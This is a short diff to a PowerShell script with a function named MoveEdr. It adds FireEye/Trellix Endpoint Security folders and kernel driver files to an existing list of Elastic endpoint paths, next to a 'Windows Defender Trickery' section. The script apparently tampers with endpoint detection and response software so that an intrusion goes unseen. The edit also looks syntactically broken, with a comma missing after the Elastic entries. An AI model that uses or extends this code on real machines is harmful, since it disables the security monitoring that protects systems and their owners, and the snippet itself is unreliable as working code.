@@ -75,7 +75,14 @@ function MoveEdr{
 			"C:\Program Files\Elastic",
 			"C:\Windows\System32\drivers\elastic-endpoint-driver.sys",
 			"C:\Windows\System32\drivers\ElasticElam.sys"
-		)
+
+			#Fireeye/XAGT/xAgent/Trellix Endpoint Security
+			"C:\Program Files (x86)\FireEye\xagt",
+			"C:\Windows\System32\drivers\FeKern.sys",
+			"C:\Windows\System32\drivers\FeElam.sys",
+			"C:\ProgramData\FireEye\xagt\exts\MalwareProtection\sandbox\fe_avk.sys",
+			"C:\Windows\FireEye"
+			)
 		
 		# Windows Defender Trickery
 		if ($DefenderHard){
